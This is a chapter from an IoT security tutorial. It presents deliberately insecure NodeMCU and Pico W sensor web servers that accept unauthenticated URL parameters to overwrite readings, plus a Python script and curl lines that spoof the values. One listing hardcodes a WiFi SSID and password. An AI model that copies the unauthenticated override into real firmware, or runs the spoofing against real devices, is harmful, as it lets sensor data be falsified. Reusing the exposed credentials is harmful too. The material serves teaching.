@@ -1,0 +1,353 @@
+% ==========================================
+% CHAPTER 04: Level 6 Injection
+% ==========================================
+\chapter{Level 6: The Unsecured Injection Attack}
+
+\textbf{In This Chapter:}
+\begin{itemize}
+    \item Systematically demonstrating architectural injection vulnerabilities.
+    \item Code execution of `Level\_6\_IoT\_Insecurity\_Demo` and `03\_unsecured\_web.py`.
+    \item Reviewing the interactive Attacker script execution methodologies.
+\end{itemize}
+
+What defines an insecure system? It is a mechanism that inherently trusts user input blindly. We will build a system designed to read temperature. However, we will install a common developer "debug" flaw: the server will arbitrarily listen for URL Query Parameters (\texttt{?t=} and \texttt{?h=}). 
+
+If an external agent manipulates the URL, the algorithm will instantly discard the real sensor telemetry and permanently replace it with the hacker's numbers. And it requires no password.
+
+\section{Systematic NodeMCU Implementation (Level 6)}
+Below lies the unabridged C++ execution mapped directly from the `23022026\_Level\_6\_IoT\_Insecurity\_Demo\_With\_Description.ino` file.
+
+\begin{lstlisting}[language=C++, caption=23022026\_Level\_6\_IoT\_Insecurity\_Demo\_With\_Description.ino]
+/*
+  IoT Insecurity Demo
+  -------------------
+  Board: NodeMCU (ESP8266)
+  Sensor: DHT22
+  
+  PURPOSE:
+  1. Show real temperature and humidity by default.
+  2. Allow anyone on same WiFi to override values using URL.
+  3. Fake values remain until device is rebooted.
+  
+  HOW TO HACK:
+  Browser:
+    http://YOUR_IP/?t=100&h=5
+  
+  CMD (Windows):
+    curl "http://YOUR_IP/?t=80&h=10"
+*/
+
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DHT.h>
+
+#define D5PIN D5
+#define DHTTYPE DHT22
+
+// ---------------- WIFI DETAILS ----------------
+const char* ssid = "drarka.in";            // Your WiFi Name
+const char* pass = "arkaprabha@1985";      // Your WiFi Password
+
+// ---------------- OBJECTS ----------------
+DHT dht(D5PIN, DHTTYPE);
+ESP8266WebServer server(80);
+
+// ---------------- OVERRIDE STORAGE ----------------
+// If these stay NAN → real sensor data is shown
+// If changed → fake values will be shown
+float overrideTemp = NAN;
+float overrideHum  = NAN;
+
+void setup() {
+
+  Serial.begin(9600);       // Start Serial Monitor
+  dht.begin();              // Start DHT sensor
+
+  WiFi.begin(ssid, pass);   // Connect to WiFi
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+  }
+
+  Serial.println("Connected!");
+  Serial.print("Open this IP in browser: ");
+  Serial.println(WiFi.localIP());
+
+  // ------------- WEB SERVER HANDLER -------------
+  server.on("/", []() {
+
+    // If URL contains ?t= or ?h= → store override permanently
+    if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
+    if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();
+
+    // Read real sensor values
+    float t = dht.readTemperature();
+    float h = dht.readHumidity();
+
+    // If override exists → replace real data
+    if (!isnan(overrideTemp)) t = overrideTemp;
+    if (!isnan(overrideHum))  h = overrideHum;
+
+    // -------- HTML PAGE --------
+    String page = "<html>";
+    page += "<head><meta http-equiv='refresh' content='5'></head>";
+    page += "<body bgcolor='black' text='white'><center>";
+
+    page += "<h1>Temperature</h1>";
+    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";
+
+    page += "<h1>Humidity</h1>";
+    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";
+
+    page += "</center></body></html>";
+
+    server.send(200, "text/html", page);
+  });
+
+  server.begin();  // Start server
+}
+
+void loop() {
+  server.handleClient();  // Keep server running
+}
+\end{lstlisting}
+
+
+\section{Systematic Pico W Implementation (Level 3 Unsecured)}
+
+Because native MicroPython handles bare network execution via pure TCP arrays, the vulnerability requires aggressive string parsing at scale. Notice the manual list index iteration surrounding line `78`.
+
+\begin{lstlisting}[language=Python, caption=03\_unsecured\_web.py]
+import network
+import socket
+import time
+import machine
+import dht
+import secrets
+
+# -------------------------
+# Sensor Setup
+# -------------------------
+sensor = dht.DHT22(machine.Pin(15))
+
+# -------------------------
+# WiFi Connection
+# -------------------------
+wlan = network.WLAN(network.STA_IF)
+wlan.active(True)
+wlan.connect(secrets.SSID, secrets.PASSWORD)
+
+print("Connecting to WiFi...")
+
+while not wlan.isconnected():
+    time.sleep(1)
+
+print("Connected!")
+print("IP Address:", wlan.ifconfig()[0])
+
+# -------------------------
+# Socket Server Setup
+# -------------------------
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', 80))
+s.listen(5)
+s.settimeout(1)   # ⭐ IMPORTANT → Prevents freezing
+
+# -------------------------
+# Variables
+# -------------------------
+spoof_active = False
+t, h = "0.0", "0.0"
+
+# -------------------------
+# Main Loop
+# -------------------------
+try:
+    while True:
+
+        # Read real sensor if not spoofing
+        if not spoof_active:
+            try:
+                sensor.measure()
+                t = "{:.1f}".format(sensor.temperature())
+                h = "{:.1f}".format(sensor.humidity())
+            except:
+                pass
+
+        # Wait for connection (non-blocking)
+        try:
+            conn, addr = s.accept()
+        except OSError:
+            time.sleep(0.1)
+            continue
+
+        try:
+            raw_req = conn.recv(1024)
+            if not raw_req:
+                conn.close()
+                continue
+
+            request = raw_req.decode()
+
+            # -------------------------
+            # Spoof Request
+            # -------------------------
+            if '/set_env?' in request:
+                try:
+                    query = request.split('?')[1].split(' ')[0]
+                    for p in query.split('&'):
+                        if p.startswith('t='):
+                            t = p.split('=')[1]
+                        if p.startswith('h='):
+                            h = p.split('=')[1]
+                    spoof_active = True
+                except:
+                    pass
+
+            # -------------------------
+            # Reset Request
+            # -------------------------
+            if '/reset' in request:
+                spoof_active = False
+
+            # -------------------------
+            # HTML Page
+            # -------------------------
+            html = f"""<!DOCTYPE html>
+<html>
+<head>
+<title>Remote Monitor</title>
+<meta http-equiv="refresh" content="2">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {{
+    background-color: #121212;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}}
+.card {{
+    background-color: #1e1e1e;
+    padding: 2rem;
+    border-radius: 1rem;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    text-align: center;
+    width: 300px;
+}}
+.temp {{
+    color: cyan;
+    font-size: 2.5rem;
+    font-weight: bold;
+}}
+.hum {{
+    color: pink;
+    font-size: 2.5rem;
+    font-weight: bold;
+}}
+.label {{
+    color: #888;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}}
+.status {{
+    margin-top: 1rem;
+    color: orange;
+    font-size: 0.9rem;
+}}
+button {{
+    margin-top: 1rem;
+    padding: 8px 15px;
+    border: none;
+    border-radius: 6px;
+    background: #333;
+    color: white;
+}}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="label">Temperature</div>
+    <div class="temp">{t} &deg;C</div>
+    <div class="label">Humidity</div>
+    <div class="hum">{h} %</div>
+    <div class="status">
+        {"SPOOF MODE ACTIVE" if spoof_active else "LIVE SENSOR DATA"}
+    </div>
+    <a href="/reset"><button>Reset to Live</button></a>
+</div>
+</body>
+</html>"""
+
+            # Send response
+            conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
+            conn.sendall(html)
+            conn.close()
+
+        except Exception as e:
+            conn.close()
+
+        time.sleep(0.1)
+
+# -------------------------
+# Clean Exit
+# -------------------------
+except KeyboardInterrupt:
+    print("Server Stopped by User")
+    s.close()
+\end{lstlisting}
+
+\section{The Exploitation Mechanism (Python Hacker Script)}
+
+The following unabridged code represents the `03\_attack.py` Interactive Python Script. This is designed to be executed strictly from the Attacker's computer on the Local Area Network using native execution (`python 03\_attack.py`).
+
+\begin{lstlisting}[language=Python, caption=03\_attack.py]
+# Simple Interactive Exploit Tool (Educational Demo Only)
+
+import urllib.request
+
+print("=== PICO VULNERABILITY DEMO TOOL ===")
+print("------------------------------------")
+
+# 1. Ask Target IP
+ip = input("Enter Pico IP address: ").strip()
+
+# 2. Ask Mode
+print("\nSelect Mode:")
+print("1. Spoof Data")
+print("2. Reset System")
+
+choice = input("Enter choice (1 or 2): ").strip()
+
+# 3. SPOOF MODE
+if choice == "1":
+    temp = input("Enter fake Temperature: ").strip()
+    hum = input("Enter fake Humidity: ").strip()
+    
+    url = f"http://{ip}/set_env?t={temp}&h={hum}"
+    print("\n[*] Sending spoofed data...")
+
+# 4. RESET MODE
+elif choice == "2":
+    url = f"http://{ip}/reset"
+    print("\n[*] Sending reset command...")
+
+else:
+    print("Invalid choice!")
+    exit()
+
+# 5. Send Request
+try:
+    urllib.request.urlopen(url, timeout=5)
+    print("[+] Attack Sent Successfully!")
+    print("[+] Check Pico dashboard now.")
+except Exception as e:
+    print("[-] Failed:", e)
+\end{lstlisting}
+
+\begin{takeawaybox}
+This interactive terminal script completely nullifies the physical existence of the IoT sensor array without demanding a single credential. The ease of execution using generic Python libraries (like \texttt{urllib} or \texttt{requests}) highlights the fundamental flaw in prioritizing immediate functionality over rigorous authentication checks.
+\end{takeawaybox}
